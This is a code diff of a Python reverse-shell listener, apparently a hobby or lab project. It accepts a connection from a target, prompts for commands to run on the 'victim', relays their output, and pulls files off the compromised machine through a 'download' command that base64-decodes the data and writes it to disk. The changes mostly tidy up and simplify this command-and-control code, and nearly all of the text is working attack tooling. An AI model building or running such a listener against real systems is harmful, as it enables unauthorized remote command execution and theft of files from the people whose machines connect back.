@@ -19,8 +19,8 @@ class fc: #ascii font color class
 
 
 class Args: #take args (set to defaults on kali)
-    
-    
+
+
     def __init__(self):
         parser = argparse.ArgumentParser()
         parser.add_argument('-i','--IP',dest = 'ip', help = 'Enter target IP address.')
@@ -57,47 +57,40 @@ class Listener:
             spinner.terminate()
             print('\nSIGINT caught, exiting...')
             sys.exit()
-        #print(connection) #connection is the socket object with information about local address and remote address
+        ##print(connection) #connection is the socket object with information about local address and remote address
         spinner.terminate()
         print(f'{fc.g}Connection established with {fc.pink}{str(address[0])}{fc.end} on port {fc.pink}{str(address[1])}{fc.end}')
         print(f'Enter {fc.rw}\'bye\'{fc.end} to close connection')
     
-    def isBase64(self,string):
-        regEx = "^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)?$"
-        if string % 4 == 0:
-            #p
-            search = re.search(regEx,string)
-            if search:
-                return True
-        else:
-            return False
 
-    def sendStream(self,data):#base sender with json serialization
+    def sendStream(self,data): #base sender with json serialization
         jsData = json.dumps(data)
         self.connection.send(str(jsData).encode('utf-8'))
     
     
     def recvStream(self):
-
         jsData = ''
-        #print(getsizeof(jsData))
+        ##print(getsizeof(jsData))
+        
         while True:
+            
             try:
-                print('Receiving data')
+                #print('Receiving data')
                 recvData = self.connection.recv(1024)
                 if isinstance(recvData,bytes):
                     recvData = recvData.decode()
-                #print(getsizeof(jsData))
+                ##print(getsizeof(jsData))
                 #byteSize = getsizeof(jsData)
                 #self.byteTotal += byteSize
                 jsData = jsData + recvData
                 return json.loads(jsData)
+        
             except Exception as e:
-                print(f'{fc.rw}{e}{fc.end}')
+                #print(f'{fc.rw}{e}{fc.end}')
                 continue
     
     
-    def spinner(self):#spinner
+    def spinner(self): #spinner
         spinnerChars = ['-', '/', '|', '\\']
         while True:
             for char in cycle(spinnerChars):
@@ -108,91 +101,31 @@ class Listener:
     def utf8len(self,string):
         return len(string.encode('utf-8'))
     
-    def write_file(self,file,content):
-        print(type(content))
-        content = content['data']
-        print(content)
-        with open(file,'wb') as write_file:
-            write_file.write(base64.b64decode(content))
-        return (f'Successfully downloaded {file}')
-        
-
-    
-    
-    
-    
-    def writeFile(self,file,content):
-        charFiles = ['txt','py','docx','doc','log'] 
-        picFile = ['png','jpeg','jpg']
-        
-        #print(fileType) 
-        try:
-            fileType = file.split('.')[1]
-            if fileType in charFiles:
-                if isinstance(content,dict):
-                    #print(type(content))
-                    content = content['data']
-                    #print(content)
-                    if isinstance(content,str):
-                        content = content.encode()
-                    
-                    with open(file,'wb') as writeFile:
-                        writeFile.write(content) 
-                        #print(f'Downloaded file: {file}')
-                    return (f'Successfully downloaded {file}')
-                else:
-                    return ('Could not download file')
+    def write_file(self,file,content): #should be default get a dictionary
+              
+        if isinstance(content,dict):
             
-            elif fileType in picFile:
-                #print(file)
-                if isinstance(content,dict):
-                    content = content['data']
-                    #print(type(content))
-                with open(file,'wb') as writeFile:
-                    writeFile.write(base64.b64decode(content))
+            if 'data' in content.keys():
+                content = content['data']
+                #print(content)
+                
+                with open(file,'wb') as write_file:
+                    write_file.write(base64.b64decode(content))
                 return (f'Successfully downloaded {file}')
             
             else:
-                print(logging.info('file ext'))
-                try:
-                    
-                    if isinstance(content,dict):
-                        content = content['data']
-                        print(f'Content data type from dict: {type(content)}')
-                        print('trying b64 decode')
-                        print(len(content))
-                        remainder = (len(content)%4)
-                        if remainder == 0:
-                            print('Divisiable by \'4\', likely base64 encoded.')
-
-                        try:
-                            content = base64.b64decode(content)
-                            print('Decoded string')
-                        
-                        except Exception as e:
-                            print(traceback.format_exc())
-                                                        
-                        print(len(content))
-                        if isinstance(content,str):
-                            content = content.encode()
-                    print(f'Content after b64 and encode: {type(content)}')
-                    
-                    with open(file,'wb') as writeFile:
-                        writeFile.write(content)
-                        return (f'Successfully downloaded {file}')                
-                
-                except Exception as e:
-                    print(traceback.format_exc())
-                    return 'Could not download file'
-        
-        except Exception as e:
-            print(e)
+                content = content['fault']
+                #print(content)
+                content = base64.b64decode(content)
+                #print(type(content))
+                content = content.decode()
+                return content
 
 
     def executeCmd(self,cmd):
         #cmd = str(cmd).encode('utf-8')
-        #print('executeCmd')
-        #print(cmd)
+        ##print('executeCmd')
+        ##print(cmd)
         time.sleep(1)
         self.sendStream(cmd)
         #self.sendStream('\r\n')
@@ -205,32 +138,13 @@ class Listener:
     def run(self): #so my run() function will need to do the exit call logic, execCmd just needs to send and receive the command from run
         while True:
 
-            #########################################REMOVE#BLANK#STRING#CHECKING########################################################
-            # #inputChecker = False
-            
-            # #while inputChecker == False:
-                
-            #     #try:
-            #         #cmd = input(f'{fc.r}Enter command to execute on target:{fc.end}')
-            #         if cmd == '':
-            #             print(f'{fc.rw}Command must not be blank!{fc.end}')
-            #         else:
-            #             inputChecker = True
-            #         #print(cmd)
-            #         cmd = cmd.split(' ')
-            #         #print(cmd)
-            #     except KeyboardInterrupt:
-            #         self.sendStream(['bye'])
-            #         self.listener.close()
-            #         exit()
-            #########################################REMOVE#BLANK#STRING#CHECKING########################################################
-
             cmd = input(f'{fc.r}Enter command to execute on target:{fc.end}')
-            #print(cmd)
+            ##print(cmd)
             cmd = cmd.split(' ')
-            #print(cmd[0])
+            ##print(cmd[0])
+            
             if cmd[0] == '':
-                print(cmd)
+                #print(cmd)
                 cmd[0] = "\r\n" 
                 result = self.executeCmd(cmd)   
                 print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long')
@@ -241,6 +155,7 @@ class Listener:
             elif cmd[0] != 'bye':
                             
                 if cmd[0] == 'download':
+                    
                     try:
                         print(f'{fc.purple}#{fc.end}'*100)
                         print(f'{fc.b}{self.write_file(cmd[1],self.executeCmd(cmd))}{fc.end}')
@@ -248,10 +163,8 @@ class Listener:
                     
                     except IndexError:
                         print('No argument for download, command not executed')
-
-                
+ 
                 else:
-
                     result = self.executeCmd(cmd)   
                     print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long')
                     print(f'{fc.purple}#{fc.end}'*100)
@@ -281,6 +194,3 @@ except Exception:
 except KeyboardInterrupt:
     print(f'{fc.rw}Interrupt caught, exiting...{fc.end}')
     sys.exit()
-
-
-
